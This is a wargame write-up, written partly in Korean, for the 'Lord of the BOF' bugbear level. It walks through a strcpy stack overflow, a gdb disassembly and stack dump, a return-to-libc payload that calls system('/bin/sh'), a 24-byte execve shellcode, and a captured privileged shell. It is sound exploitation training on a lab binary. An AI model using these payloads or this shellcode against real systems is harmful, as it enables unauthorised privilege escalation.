# Level 12, Darkknight -> Bugbear

### bugbear.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - bugbear
        - RTL1
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack betrayed you!!\n");   // 으앜
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

### Analysis

#### Disassembling the "bugbear"

```
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,44
0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:    jg     0x8048453 <main+35>
0x804843c <main+12>:    push   0x8048500
0x8048441 <main+17>:    call   0x8048350 <printf>
0x8048446 <main+22>:    add    %esp,4
0x8048449 <main+25>:    push   0
0x804844b <main+27>:    call   0x8048360 <exit>
0x8048450 <main+32>:    add    %esp,4
0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:    add    %eax,4
0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:    add    %edx,47
0x804845e <main+46>:    cmp    BYTE PTR [%edx],0xbf
0x8048461 <main+49>:    jne    0x8048480 <main+80>
0x8048463 <main+51>:    push   0x804850c
0x8048468 <main+56>:    call   0x8048350 <printf>
0x804846d <main+61>:    add    %esp,4
0x8048470 <main+64>:    push   0
0x8048472 <main+66>:    call   0x8048360 <exit>
0x8048477 <main+71>:    add    %esp,4
0x804847a <main+74>:    lea    %esi,[%esi]
0x8048480 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048483 <main+83>:    add    %eax,4
0x8048486 <main+86>:    mov    %edx,DWORD PTR [%eax]
0x8048488 <main+88>:    push   %edx
0x8048489 <main+89>:    lea    %eax,[%ebp-40]
0x804848c <main+92>:    push   %eax
0x804848d <main+93>:    call   0x8048370 <strcpy>
0x8048492 <main+98>:    add    %esp,8
0x8048495 <main+101>:   lea    %eax,[%ebp-40]
0x8048498 <main+104>:   push   %eax
0x8048499 <main+105>:   push   0x8048522
0x804849e <main+110>:   call   0x8048350 <printf>
0x80484a3 <main+115>:   add    %esp,8
0x80484a6 <main+118>:   leave
0x80484a7 <main+119>:   ret
```

#### Estimated Stack Structure

```
|  i      (4 bytes)       | [%ebp-44]
|  BUFFER (40 bytes)      | [%ebp-40]
|  SFP    (4 bytes)       | [%ebp]
|  RET    (4 bytes)       | [%ebp+4]
|  ARGC   (4 bytes)       | [%ebp+8]
|  Pointer to ARGV[0]     | [%ebp+C]
```

#### Observed Stack Structure (bp at *main+101)

```
(gdb) run `python -c "print '/bin/sh'+'A'*36+'\xe0\x8a\x05\x40'+'\x90'*4+'\xf9\xbf\x0f\x40'"`
Starting program: /home/darkknight/bugbear-cp `python -c "print '/bin/sh'+'A'*36+'\xe0\x8a\x05\x40'+'\x90'*4+'\xf9\xbf\x0f\x40'"`

Breakpoint 1, 0x8048495 in main ()
(gdb) x/100x $esp
0xbffffa8c:     0x40021ca0      0x6e69622f      0x4168732f      0x41414141  -> int i, "/bin/sh", char buffer[40]
0xbffffa9c:     0x41414141      0x41414141      0x41414141      0x41414141  -> char buffer[40]
0xbffffaac:     0x41414141      0x41414141      0x41414141      0xe0414141  -> char buffer[40]
0xbffffabc:     0x9040058a      0xf9909090      0x00400fbf      0xbffffb10
0xbffffacc:     0x40013868      0x00000002      0x08048380      0x00000000
0xbffffadc:     0x080483a1      0x08048430      0x00000002      0xbffffb04
0xbffffaec:     0x080482e0      0x080484dc      0x4000ae60      0xbffffafc
0xbffffafc:     0x40013e90      0x00000002      0xbffffbff      0xbffffc1b
0xbffffb0c:     0x00000000      0xbffffc53      0xbffffc68      0xbffffc81
0xbffffb1c:     0xbffffca0      0xbffffcc2      0xbffffcd2      0xbffffe95
0xbffffb2c:     0xbffffeb4      0xbffffed4      0xbffffee9      0xbfffff0b
0xbffffb3c:     0xbfffff16      0xbfffff29      0xbfffff31      0xbfffff42
0xbffffb4c:     0xbfffff4c      0xbfffff5a      0xbfffff6b      0xbfffff79
0xbffffb5c:     0xbfffff84      0xbfffff9a      0x00000000      0x00000003
0xbffffb6c:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffb7c:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffb8c:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffb9c:     0x08048380      0x0000000b      0x00000200      0x0000000c
0xbffffbac:     0x00000200      0x0000000d      0x00000200      0x0000000e
0xbffffbbc:     0x00000200      0x00000010      0x0fabfbff      0x0000000f
0xbffffbcc:     0xbffffbfa      0x00000000      0x00000000      0x00000000
0xbffffbdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbec:     0x00000000      0x00000000      0x00000000      0x36690000
0xbffffbfc:     0x2f003638      0x656d6f68      0x7261642f      0x696e6b6b
0xbffffc0c:     0x2f746867      0x62677562      0x2d726165      0x2f007063
```

### Exploit

#### How to pwn

Return-To-Libc

RET 주소를 스택 영역 주소를 쓸수 없으니 다른 곳에서 실행하자. 메모리에 올라와 있는 공유 라이브러리를 잘 써먹자.
공유 라이브러리가 올라오는 주소는 바뀌지 않는다ㅋ 그래서 gdb에서 함수 주소 찾기만 하면 된다.

1. 공유 라이브러리에 올라간 `system()`의 주소를 찾는다.
```
(gdb) print system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
```

2. `system()` 안에 있는 "/bin/sh"의 주소를 찾는다.
```c
#include <stdio.h>

int main(void){
    long shell = 0x40058ae0;
    while(memcmp((void*)shell, "/bin/sh", 8))
        shell++;
    printf("%x\n", shell);
}
```

```
[darkknight@localhost darkknight]$ ./find
400fbff9
```

3. DUMMY[44] + 0x40058ae0 + DUMMY[4] + 0x400fbff9

> DUMMY[44] = char buffer[40] + SFP
> 0x40058ae0 = Overwritten RET, `system()` 주소
> DUMMY[4] = `CALL`쓴것 처럼 RET주소 공간 추가
> 0x400fbff9 = `system()`에 넣을 인자 ('/bin/sh')

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
./bugbear `python -c "print 'A'*44+'\xe0\x8a\x05\x40'+'\x90'*4+'\xf9\xbf\x0f\x40'"`
```

### Result

```
[darkknight@localhost darkknight]$ ./bugbear `python -c "print 'A'*44+'\xe0\x8a\x05\x40'+'\x90'*4+'\xf9\xbf\x0f\x40'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒@▒▒▒▒▒@
bash$ id
uid=512(darkknight) gid=512(darkknight) euid=513(bugbear) egid=513(bugbear) groups=512(darkknight)
bash$ my-pass
euid = 513
new divide
```